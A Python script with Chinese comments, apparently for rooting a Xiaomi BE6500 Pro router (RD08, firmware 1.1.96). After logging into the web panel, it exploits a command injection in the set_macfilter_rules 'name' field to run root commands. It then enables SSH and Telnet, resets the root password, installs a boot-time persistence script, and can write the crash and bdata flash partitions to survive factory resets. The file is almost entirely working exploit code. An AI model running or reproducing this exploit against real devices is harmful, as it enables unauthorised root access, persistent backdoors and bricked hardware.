#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
==============================================================
 小米路由器 BE6500 Pro (RD08, 固件 1.1.96) SSH 工具
==============================================================
 原理: /api/xqsystem/set_macfilter_rules 的 name 参数命令注入
       (hackCheck 白名单参数 + 无 cmdSafeCheck + 无引号拼接)
 声明: 本工具由月之暗面 K3 模型(Kimi Code)实现, 仅供学习研究,
       请勿用于未经授权的设备。
==============================================================

依赖: pip install requests ssh2-python
"""

import base64
import hashlib
import random
import re
import select
import shlex
import socket
import sys
import time
import uuid

try:
    import requests
except ImportError:
    sys.exit('缺少依赖: pip install requests')

# ---------------------------------------------------------------- 基础工具

if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stdin.reconfigure(encoding='utf-8')
    except Exception:
        pass

def _windows_console():
    """Only use console APIs when stdin itself is a Windows console handle."""
    import ctypes
    from ctypes import wintypes
    import msvcrt
    try:
        handle = msvcrt.get_osfhandle(sys.stdin.fileno())
        kernel = ctypes.WinDLL('kernel32', use_last_error=True)
        kernel.GetConsoleMode.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
        kernel.GetConsoleMode.restype = wintypes.BOOL
        kernel.SetConsoleMode.argtypes = [wintypes.HANDLE, wintypes.DWORD]
        kernel.SetConsoleMode.restype = wintypes.BOOL
        mode = wintypes.DWORD()
        if kernel.GetConsoleMode(handle, ctypes.byref(mode)):
            return kernel, handle, mode.value
    except (OSError, ValueError, AttributeError):
        pass
    return None


def _visible_secret_input(prompt):
    print('  [!] 当前输入环境无法隐藏密码，输入可能显示在屏幕上；完成后按回车。', flush=True)
    return input(prompt)


def _hidden_input(prompt):
    """Read from the same stdin as ordinary prompts, with console echo disabled."""
    console = _windows_console()
    if console is None:
        return _visible_secret_input(prompt)
    kernel, handle, original_mode = console
    # Enable line editing and Ctrl+C processing, disable character echo.
    hidden_mode = (original_mode | 0x0001 | 0x0002) & ~0x0004
    if not kernel.SetConsoleMode(handle, hidden_mode):
        return _visible_secret_input(prompt)
    try:
        print('  输入密码时不显示字符或星号，完成后按回车。', flush=True)
        return input(prompt)
    finally:
        restored = kernel.SetConsoleMode(handle, original_mode)
        print(flush=True)
        if not restored:
            print('  [!] 终端输入模式恢复失败，请关闭当前终端后重新打开。', flush=True)

def ask(prompt, default=None, secret=False):
    """带默认值的输入提示"""
    tip = f'{prompt} [{default}]: ' if default is not None else f'{prompt}: '
    try:
        if secret:
            if not sys.stdin.isatty():
                v = _visible_secret_input(tip)
            elif sys.platform == 'win32':
                v = _hidden_input(tip)
            else:
                import getpass
                print('  输入密码时不显示字符或星号，完成后按回车。', flush=True)
                v = getpass.getpass(tip)
        else:
            v = input(tip)
    except (EOFError, KeyboardInterrupt):
        print('\n已取消')
        sys.exit(0)
    if not secret:
        v = v.strip()
    return v if v else default


def validate_password(password):
    if not isinstance(password, str) or not password:
        raise ValueError('密码不能为空')
    if any(ord(ch) < 32 or ord(ch) == 127 for ch in password):
        raise ValueError('密码不能包含换行、NUL 或其他控制字符')


class RemoteCommandError(RuntimeError):
    def __init__(self, status, stdout='', stderr=''):
        self.status = status
        self.stdout = stdout
        self.stderr = stderr
        super().__init__(f'远程命令失败 (退出码 {status}): {stderr or stdout}')

def confirm(prompt, default=False):
    v = ask(f'{prompt} (y/n)', 'y' if default else 'n')
    return v.lower() in ('y', 'yes', '是')

def tcp_open(ip, port, timeout=2):
    try:
        socket.create_connection((ip, port), timeout=timeout).close()
        return True
    except OSError:
        return False

# ---------------------------------------------------------------- Web 登录 & 漏洞利用

class RouterWeb:
    def __init__(self, ip, password):
        self.ip = ip
        self.password = password
        self.stok = None
        self.s = requests.Session()

    def login(self):
        ip = self.ip
        page = self.s.get(f'http://{ip}/cgi-bin/luci/web', timeout=5).text
        mac = re.search(r"var deviceId = '(.*?)'", page).group(1)
        key = re.search(r"key: '(.*?)',", page).group(1)
        nonce = f"0_{mac}_{int(time.time())}_{random.randint(1000, 10000)}"
        info = self.s.get(f'http://{ip}/cgi-bin/luci/api/xqsystem/init_info', timeout=5).json()
        h = hashlib.sha256 if str(info.get('newEncryptMode')) == '1' else hashlib.sha1
        pwd = h((nonce + h((self.password + key).encode()).hexdigest()).encode()).hexdigest()
        r = self.s.post(f'http://{ip}/cgi-bin/luci/api/xqsystem/login',
                        data={'username': 'admin', 'password': pwd, 'logtype': '2',
                              'nonce': nonce}, timeout=5).json()
        if r.get('code') != 0:
            raise RuntimeError(f'管理密码登录失败: {r}')
        self.stok = r['token']
        return info

    def rce(self, mac, cmd):
        """通过 macfilter name 注入执行命令。payload 不能含 ';'。"""
        name = f'x$({cmd})y'
        if ';' in name:
            raise ValueError('payload 不能含分号')
        r = self.s.post(
            f'http://{self.ip}/cgi-bin/luci/;stok={self.stok}/api/xqsystem/set_macfilter_rules',
            data={'mac': mac, 'name': name, 'option': 'add', 'wan': ''}, timeout=20)
        r.raise_for_status()
        return r.json().get('code') == 0

    def macfilter_del(self, mac):
        r = self.s.post(
            f'http://{self.ip}/cgi-bin/luci/;stok={self.stok}/api/xqsystem/set_macfilter_rules',
            data={'mac': mac, 'name': 'x', 'option': 'del', 'wan': ''}, timeout=8)
        r.raise_for_status()
        if r.json().get('code') != 0:
            raise RuntimeError('删除 MAC 规则被路由器拒绝')

# ---------------------------------------------------------------- SSH / Telnet 执行

class SSH:
    def __init__(self, ip, user, password):
        from ssh2.session import Session
        self.sock = socket.create_connection((ip, 22), timeout=5)
        try:
            self.s = Session()
            self.s.set_timeout(5000)
            self.s.handshake(self.sock)
            self.s.userauth_password(user, password)
            self.sock.setblocking(False)
            self.s.set_blocking(False)
        except BaseException:
            self.close()
            raise

    def _wait(self, deadline):
        from ssh2.session import (LIBSSH2_SESSION_BLOCK_INBOUND,
                                  LIBSSH2_SESSION_BLOCK_OUTBOUND)
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError('SSH 命令执行超时')
        directions = self.s.block_directions()
        readable = [self.sock] if directions & LIBSSH2_SESSION_BLOCK_INBOUND else []
        writable = [self.sock] if directions & LIBSSH2_SESSION_BLOCK_OUTBOUND else []
        # No libssh2 direction can also mean that we are waiting for remote EOF.
        if not readable and not writable:
            readable = [self.sock]
        ready = select.select(readable, writable, [], remaining)
        if not ready[0] and not ready[1]:
            raise TimeoutError('SSH 命令执行超时')

    def _call(self, operation, deadline):
        from ssh2.error_codes import LIBSSH2_ERROR_EAGAIN
        while True:
            if time.monotonic() >= deadline:
                raise TimeoutError('SSH 命令执行超时')
            result = operation()
            if result != LIBSSH2_ERROR_EAGAIN:
                if isinstance(result, int) and result < 0:
                    raise ConnectionError(f'SSH 通道错误: {result}')
                return result
            self._wait(deadline)

    def run(self, cmd, timeout=30):
        from ssh2.error_codes import LIBSSH2_ERROR_EAGAIN
        deadline = time.monotonic() + timeout
        try:
            ch = self._call(self.s.open_session, deadline)
            self._call(lambda: ch.execute(cmd), deadline)
            self._call(ch.send_eof, deadline)
            out, err = bytearray(), bytearray()
            while True:
                if time.monotonic() >= deadline:
                    raise TimeoutError('SSH 命令执行超时')
                progress = False
                for reader, buffer in ((ch.read, out), (ch.read_stderr, err)):
                    n, data = reader()
                    if n > 0:
                        buffer.extend(data)
                        progress = True
                    elif n < 0 and n != LIBSSH2_ERROR_EAGAIN:
                        raise ConnectionError(f'SSH 读取错误: {n}')
                # Drain both streams even when EOF has already arrived.
                if not progress:
                    if ch.eof():
                        break
                    self._wait(deadline)
            self._call(ch.wait_eof, deadline)
            self._call(ch.close, deadline)
            self._call(ch.wait_closed, deadline)
            status = ch.get_exit_status()
            stdout = out.decode(errors='replace')
            stderr = err.decode(errors='replace')
            if status != 0:
                raise RemoteCommandError(status, stdout, stderr)
            return stdout
        except RemoteCommandError:
            raise
        except (TimeoutError, ConnectionError):
            self.close()
            raise
        except Exception as exc:
            self.close()
            raise ConnectionError(f'SSH 执行中断: {exc}') from exc

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass

class Telnet:
    """应急通道: 重启后 dropbear 未启动时用 (nvram telnet_en=1)"""
    def __init__(self, ip, user, password):
        validate_password(password)
        self.s = socket.create_connection((ip, 23), timeout=5)
        self._pending = b''
        self._iac = bytearray()
        try:
            self._expect(rb'(?im)(?:login|username):\s*$', 10)
            self.s.sendall(user.encode() + b'\n')
            self._expect(rb'(?im)password:\s*$', 10)
            self.s.sendall(password.encode() + b'\n')
            self._expect(rb'(?m)^[^\r\n]*[#$>]\s*$', 15)
            verify_root(self)
        except BaseException:
            self.close()
            raise

    def _decode_telnet(self, data):
        """Strip IAC negotiation, including commands split across recv calls."""
        self._iac.extend(data)
        out = bytearray()
        while self._iac:
            if self._iac[0] != 255:
                out.append(self._iac.pop(0))
                continue
            if len(self._iac) < 2:
                break
            command = self._iac[1]
            if command == 255:
                out.append(255)
                del self._iac[:2]
            elif command in (251, 252, 253, 254):
                if len(self._iac) < 3:
                    break
                option = self._iac[2]
                if command == 251:  # WILL: accept server echo and suppress-go-ahead.
                    self.s.sendall(bytes((255, 253 if option in (1, 3) else 254, option)))
                elif command == 253:  # DO: the client only supports suppress-go-ahead.
                    self.s.sendall(bytes((255, 251 if option == 3 else 252, option)))
                del self._iac[:3]
            elif command == 250:  # Subnegotiation ends at IAC SE.
                end = self._iac.find(b'\xff\xf0', 2)
                if end < 0:
                    break
                del self._iac[:end + 2]
            else:
                del self._iac[:2]
        return bytes(out)

    def _read(self, t=1.0):
        end = time.monotonic() + t
        while time.monotonic() < end:
            try:
                self.s.settimeout(max(0.001, end - time.monotonic()))
                d = self.s.recv(4096)
                if not d:
                    raise ConnectionError('Telnet 连接已关闭')
                data = self._decode_telnet(d)
                if data:
                    return data
            except socket.timeout:
                break
        return b''

    def _expect(self, pattern, timeout, login=True):
        end = time.monotonic() + timeout
        while True:
            if login and re.search(rb'(?i)login incorrect|authentication fail|access denied', self._pending):
                raise RuntimeError('Telnet 登录失败')
            match = re.search(pattern, self._pending)
            if match:
                before = self._pending[:match.start()]
                self._pending = self._pending[match.end():]
                return before, match
            remaining = end - time.monotonic()
            if remaining <= 0:
                raise TimeoutError('等待 Telnet 响应超时')
            self._pending += self._read(remaining)

    def run(self, cmd, timeout=15):
        token = uuid.uuid4().hex
        begin, end = f'__BEGIN_{token}__', f'__END_{token}__'
        line = (f"printf '\\n%s\\n' '{begin}'; sh -c {shlex.quote(cmd)} 2>&1; "
                f"__rd08_status=$?; printf '\\n%s:%s\\n' '{end}' \"$__rd08_status\"\n")
        deadline = time.monotonic() + timeout
        try:
            self.s.settimeout(max(0.001, timeout))
            self.s.sendall(line.encode())
            self._expect(rb'(?m)^' + begin.encode() + rb'\r?\n',
                         deadline - time.monotonic(), login=False)
            out, match = self._expect(rb'\r?\n' + end.encode() + rb':([0-9]+)\r?\n',
                                      deadline - time.monotonic(), login=False)
            output = out.decode(errors='replace').replace('\r\n', '\n')
            status = int(match.group(1))
            if status:
                raise RemoteCommandError(status, output)
            return output
        except RemoteCommandError:
            raise
        except BaseException:
            # A partial response cannot safely be reused for another command.
            self.close()
            raise

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass

def verify_root(sh):
    if sh.run('id -u').strip() != '0':
        raise RuntimeError('未获得已验证的 root shell')


def get_shell(ip, password, tries=1):
    """优先 SSH, 失败回退 Telnet"""
    last = None
    for attempt in range(tries):
        for transport in (SSH, Telnet):
            sh = None
            try:
                sh = transport(ip, 'root', password)
                verify_root(sh)
                return sh
            except Exception as e:
                last = e
                if sh is not None:
                    sh.close()
        if attempt + 1 < tries:
            time.sleep(2)
    raise RuntimeError(f'SSH/Telnet 均无法登录: {last}')


def verify_ssh(ip, password, tries=3):
    last = None
    for attempt in range(tries):
        sh = None
        try:
            sh = SSH(ip, 'root', password)
            verify_root(sh)
            return True
        except Exception as exc:
            last = exc
        finally:
            if sh is not None:
                sh.close()
        if attempt + 1 < tries:
            time.sleep(2)
    raise RuntimeError('SSH 登录验证失败，不能确认 SSH 已开启或密码已生效') from last

# ---------------------------------------------------------------- 功能 1: 开启临时 SSH

def enable_ssh(web, rootpw):
    validate_password(rootpw)
    password_data = base64.b64encode(f'{rootpw}\n{rootpw}\n'.encode()).decode()
    base = random.randint(0x10, 0xD0)
    macs = [f'0A:11:22:33:44:{base + i:02X}' for i in range(3)]
    steps = [
        ('写入 nvram ssh_en=1', 'nvram set ssh_en=1 && nvram set telnet_en=1 && nvram commit'),
        ('修改 dropbear 并启动', 'sed -i "s/channel=.*/channel=\\"debug\\"/g" /etc/init.d/dropbear && /etc/init.d/dropbear start'),
        ('设置 root 密码', f"printf '%s' '{password_data}' | base64 -d | passwd root"),
    ]
    attempted = []
    try:
        for i, (desc, cmd) in enumerate(steps):
            print(f'  [{i+1}/3] {desc} ...')
            attempted.append(macs[i])
            if not web.rce(macs[i], cmd):
                print('  注入请求被拒绝, 可能固件已修复')
                return False
        time.sleep(2)
        return verify_ssh(web.ip, rootpw)
    finally:
        for m in attempted:
            try:
                web.macfilter_del(m)
            except Exception as exc:
                print(f'  [!] MAC 规则 {m} 清理失败 ({type(exc).__name__})，请在后台检查')

# ---------------------------------------------------------------- 功能 2: 软固化 (开机自启)

AUTO_SSH = """#!/bin/sh
# auto_ssh: 每次开机重新放开 dropbear (nvram ssh_en 已持久, 只需修 channel)
sleep 5
sed -i 's/channel=.*/channel="debug"/g' /etc/init.d/dropbear || exit 1
/etc/init.d/dropbear restart
"""

def _install_auto_ssh(sh):
    """通过已有 shell 安装 auto_ssh 开机自启 (base64 传输避免引号问题)"""
    b64 = base64.b64encode(AUTO_SSH.encode()).decode()
    for c in [
        'mkdir -p /data/auto_ssh',
        f'echo {b64} | base64 -d > /data/auto_ssh/auto_ssh.sh',
        'chmod +x /data/auto_ssh/auto_ssh.sh',
        "uci set firewall.auto_ssh=include",
        "uci set firewall.auto_ssh.type='script'",
        "uci set firewall.auto_ssh.path='/data/auto_ssh/auto_ssh.sh'",
        "uci set firewall.auto_ssh.enabled='1'",
        "uci commit firewall",
    ]:
        sh.run(c)
    digest = hashlib.sha256(AUTO_SSH.encode()).hexdigest()
    sh.run('test -x /data/auto_ssh/auto_ssh.sh && '
           'sh -n /data/auto_ssh/auto_ssh.sh && '
           'test "$(sha256sum /data/auto_ssh/auto_ssh.sh | cut -d \' \' -f 1)" '
           f'= {shlex.quote(digest)}')
    for key, expected in (('auto_ssh', 'include'), ('auto_ssh.type', 'script'),
                          ('auto_ssh.path', '/data/auto_ssh/auto_ssh.sh'),
                          ('auto_ssh.enabled', '1')):
        if sh.run(f'uci get firewall.{key}').strip() != expected:
            raise RuntimeError(f'软固化配置校验失败: firewall.{key}')

def soft_persist(ip, rootpw):
    sh = get_shell(ip, rootpw)
    try:
        _install_auto_ssh(sh)
        return True
    finally:
        sh.close()

# ---------------------------------------------------------------- 功能 3: 深度固化 (bdata/crash, 三次重启)

def wait_router_down(ip):
    print('  等待路由器重启 ...', flush=True)
    time.sleep(5)
    for _ in range(12):  # 最多等 ~60s 让端口先关掉
        if not any(tcp_open(ip, port) for port in (22, 23, 80)):
            return True
        time.sleep(5)
    return False

def read_boot_id(sh):
    value = sh.run('cat /proc/sys/kernel/random/boot_id').strip()
    try:
        return str(uuid.UUID(value))
    except ValueError as exc:
        raise RuntimeError('无法取得有效的启动编号，停止固化') from exc


def wait_router_up(ip, rootpw, timeout=420, previous_boot_id=None):
    print('  等待路由器上线 ...', flush=True)
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        sh = None
        try:
            sh = get_shell(ip, rootpw)
            if previous_boot_id is None or read_boot_id(sh) != previous_boot_id:
                return sh
        except Exception:
            pass
        if sh is not None:
            sh.close()
        time.sleep(min(6, max(0, end - time.monotonic())))
    raise RuntimeError('等待超时，未确认路由器已重启并恢复 root 登录。请手动检查状态。')


def reboot_and_reconnect(sh, ip, rootpw):
    previous_boot_id = read_boot_id(sh)
    try:
        try:
            sh.run('reboot')
        except (ConnectionError, TimeoutError):
            # Reboot may close the connection before returning an exit status.
            print('  重启命令连接中断，继续核对下线状态及启动编号 ...')
    finally:
        sh.close()
    if not wait_router_down(ip):
        raise RuntimeError('未观察到路由器下线，停止固化；请检查实际状态后再处理')
    return wait_router_up(ip, rootpw, previous_boot_id=previous_boot_id)


def verify_flags(sh, store):
    for key, expected in (('ssh_en', '1'), ('telnet_en', '1'),
                          ('uart_en', '1'), ('boot_wait', 'on')):
        if sh.run(f'{store} get {key}').strip() != expected:
            raise RuntimeError(f'{store} 校验失败: {key}')

def deep_persist(ip, rootpw):
    print('''
  [深度固化步骤说明]
  第 1 步: 向 crash 分区写入 magic, 使 bootloader 进入调试引导 -> 自动重启
  第 2 步: 将 ssh_en/telnet_en/uart_en/boot_wait 写入 bdata (抗恢复出厂) -> 自动重启
  第 3 步: 擦除 crash 分区, 恢复正常引导 -> 自动重启, 固化完成
''')
    if not confirm('  准备就绪, 开始第 1 步?'):
        return False

    sh = get_shell(ip, rootpw)
    stage = '写入 crash'
    try:
        # Confirm that reboot verification is available before touching flash.
        read_boot_id(sh)
        sh.run("zz=$(dd if=/dev/zero bs=1 count=2 2>/dev/null) ; printf '\\xA5\\x5A%c%c' $zz $zz | mtd write - crash")
        stage = '第 1 次重启'
        sh = reboot_and_reconnect(sh, ip, rootpw)

        stage = '写入 bdata'
        print('  [第 2 步] 写入 bdata ...')
        sh.run('nvram set ssh_en=1 && nvram set telnet_en=1 && nvram set uart_en=1 && nvram set boot_wait=on && nvram commit')
        sh.run('bdata set ssh_en=1 && bdata set telnet_en=1 && bdata set uart_en=1 && bdata set boot_wait=on && bdata commit')
        verify_flags(sh, 'nvram')
        verify_flags(sh, 'bdata')
        stage = '第 2 次重启'
        sh = reboot_and_reconnect(sh, ip, rootpw)

        stage = '擦除 crash'
        print('  [第 3 步] 擦除 crash ...')
        verify_flags(sh, 'bdata')
        sh.run('mtd erase crash')
        stage = '第 3 次重启'
        sh = reboot_and_reconnect(sh, ip, rootpw)

        stage = '恢复自启配置'
        print('  [收尾] 恢复 dropbear 并重装 auto_ssh 自启 ...')
        verify_flags(sh, 'bdata')
        sh.run('sed -i \'s/channel=.*/channel="debug"/g\' /etc/init.d/dropbear && /etc/init.d/dropbear start')
        _install_auto_ssh(sh)
        return verify_ssh(ip, rootpw)
    except Exception as exc:
        raise RuntimeError(f'深度固化在「{stage}」阶段中断: {exc}。'
                           '请检查设备及分区状态，不要直接从第 1 步重跑。') from exc
    finally:
        sh.close()

# ---------------------------------------------------------------- 主流程

BANNER = '''
==============================================================
 小米 BE6500 Pro (RD08 @ 1.1.96) SSH 工具
 漏洞: set_macfilter_rules name 参数注入 (认证后 RCE)
 声明: 月之暗面 K3 模型实现, 仅供学习研究, 勿用于未授权设备
==============================================================
'''

def main():
    print(BANNER)
    ip = ask('路由器 IP', '192.168.31.1')
    if not tcp_open(ip, 80):
        sys.exit(f'[!] 无法连接 {ip}, 请确认电脑与路由器在同一网络')

    webpw = ask('路由器管理密码 (Web 后台密码)', secret=True)
    rootpw = ask('要设置的 SSH root 密码', secret=True)
    try:
        validate_password(webpw)
        validate_password(rootpw)
    except ValueError as exc:
        sys.exit(f'[!] {exc}')

    web = RouterWeb(ip, webpw)
    try:
        info = web.login()
    except Exception as e:
        sys.exit(f'[!] 登录失败: {e}')
    print(f'\n[+] 登录成功: {info.get("displayName", "?")} / 固件 {info.get("romversion", "?")}')

    while True:
        ssh_on = tcp_open(ip, 22)
        print('\n---------------- 菜单 ----------------')
        print(f'  SSH 端口状态: {"可连接（尚未验证登录）" if ssh_on else "未开放"}')
        print('  1 - 开启 SSH (漏洞利用, 重启后失效)')
        print('  2 - 固化 SSH (软固化: 开机自启脚本, 需 SSH 已开启)')
        print('  3 - 深度固化 (bdata/crash 分区, 三次重启, 抗固件升级)')
        print('  0 - 退出')
        choice = ask('请选择', '1' if not ssh_on else '0')

        if choice == '0':
            break
        elif choice == '1':
            print('\n[!] 即将对路由器执行命令注入以开启 SSH (root 权限)。')
            print('    将修改 root 密码并持久保存 ssh_en/telnet_en；dropbear 修改通常重启后失效。')
            if not confirm('确认要开启 SSH 吗?'):
                continue
            try:
                if enable_ssh(web, rootpw):
                    print(f'\n[+] SSH root 登录已验证: ssh root@{ip}，使用刚才输入的密码')
                else:
                    print('\n[-] 开启请求被拒绝，未确认成功')
            except Exception as exc:
                print(f'\n[-] 开启失败: {exc}')
        elif choice == '2':
            print('\n[!] 软固化: 在 /data/auto_ssh 安装开机自启脚本 (uci firewall include)。')
            print('    卸载自启项需执行 uci delete firewall.auto_ssh && uci commit firewall。')
            if not confirm('确认进行软固化?'):
                continue
            try:
                if soft_persist(ip, rootpw):
                    print('[+] 自启脚本及配置已安装并校验，开机自启效果仍需重启验证')
                else:
                    print('[-] 校验失败, 请手动检查')
            except Exception as e:
                print(f'[-] 失败: {e}')
        elif choice == '3':
            print('\n[!!] 深度固化会写入 bdata/crash 分区并三次重启路由器!')
            print('     建议先备份全部分区 (xmir-patcher 菜单 4)。出错可用')
            print('     小米官方修复工具 + 备份恢复。')
            if not confirm('我已了解风险并已完成备份, 确认继续?', default=False):
                continue
            try:
                if deep_persist(ip, rootpw):
                    print('[+] 三次重启、bdata 配置及 SSH 登录已验证；升级/恢复出厂后的行为需另行验证')
            except Exception as e:
                print(f'[-] 中断: {e}')
        else:
            print('无效选择')

    print('再见。')

if __name__ == '__main__':
    main()
